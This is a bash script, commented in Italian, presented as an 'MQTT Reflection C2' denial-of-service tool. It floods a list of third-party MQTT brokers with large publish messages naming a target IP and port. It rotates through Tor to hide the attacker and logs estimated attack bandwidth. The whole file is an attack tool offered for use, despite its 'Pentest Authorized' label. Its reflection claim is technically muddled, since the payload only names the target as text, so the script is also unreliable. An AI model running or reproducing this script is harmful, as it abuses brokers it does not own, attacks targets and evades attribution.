#!/bin/bash
# Real MQTT Reflection C2 - User Driven w/ Torsocks Rotation
# Ogni 2 comandi = nuovo Tor IP | Timeout | Pentest Authorized

set -euo pipefail

# Config
BROKERS_FILE="brokers.txt"
TOR_ROTATION=2
MAX_DURATION=300  # Default 5min
SLEEP_INTERVAL=0.08

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'; NC='\033[0m'
log() { echo -e "$(date +'%H:%M:%S') $1"; }

usage() {
    cat << EOF
${CYAN}Real MQTT C2 - Pentest Authorized${NC}
Uso: $0 TARGET_IP TARGET_PORT [DURATION_SEC]

Esempi:
  $0 192.0.2.1 80          # Default 300s
  $0 1.2.3.4 443 120        # 2 minuti
EOF
    exit 1
}

# Parse args
[[ $# -ge 2 ]] || usage
TARGET_IP=$1
TARGET_PORT=$2
DURATION=${3:-$MAX_DURATION}

# Validate
mapfile -t BROKERS < "$BROKERS_FILE" 2>/dev/null || { log "${RED}brokers.txt required${NC}"; usage; }
BROKER_COUNT=${#BROKERS[@]}
[[ $BROKER_COUNT -gt 0 ]] || { log "${RED}No brokers!${NC}"; exit 1; }

log "${GREEN}🎯 TARGET: $TARGET_IP:$TARGET_PORT | Duration: ${DURATION}s | Brokers: $BROKER_COUNT${NC}"
log "${CYAN}Est. DDoS: $((BROKER_COUNT * 7))Gbps | Tor rotation every ${TOR_ROTATION} cmds${NC}"

# Trap Ctrl+C + timeout
trap 'log "${YELLOW}C2 STOPPED${NC}"; exit 0' INT TERM
timeout $((DURATION + 10)) bash -c "sleep $DURATION" &

# Main attack - Torsocks EVERY 2 commands
cmd_count=0
while kill -0 $! 2>/dev/null; do
    for broker in "${BROKERS[@]}"; do
        [[ -z "$broker" ]] && continue
        ip=${broker%:*}
        port=${broker#*:}
        
        # 1400byte UDP reflection payload (client → TARGET_IP spoof)
        payload=$(printf 'flood.%s.%s.%s\0%.0s' $TARGET_IP $TARGET_PORT $(uuidgen | cut -d- -f1 | cut -c1-8) {1..1350})
        
        # TORSOCKS ROTATION
        if (( cmd_count % TOR_ROTATION == 0 )); then
            log "${YELLOW}🔄 TOR[$((cmd_count/TOR_ROTATION))] → $ip:$port${NC}"
            torsocks mosquitto_pub -h "$ip" -p "$port" -t '#' -m "$payload" -q 1 -i "sensor-$RANDOM" >/dev/null 2>&1 &
        else
            mosquitto_pub -h "$ip" -p "$port" -t '#' -m "$payload" -q 1 -i "device-$RANDOM" >/dev/null 2>&1 &
        fi
        
        log "${GREEN}⚡ #$((++cmd_count)) $ip:$port → $TARGET_IP:$TARGET_PORT${NC}"
        sleep $SLEEP_INTERVAL
    done
done

log "${RED}⏰ TIMEOUT $DURATION s | Total cmds: $cmd_count | DDoS: ~$((cmd_count*7/100))Gbps${NC}"
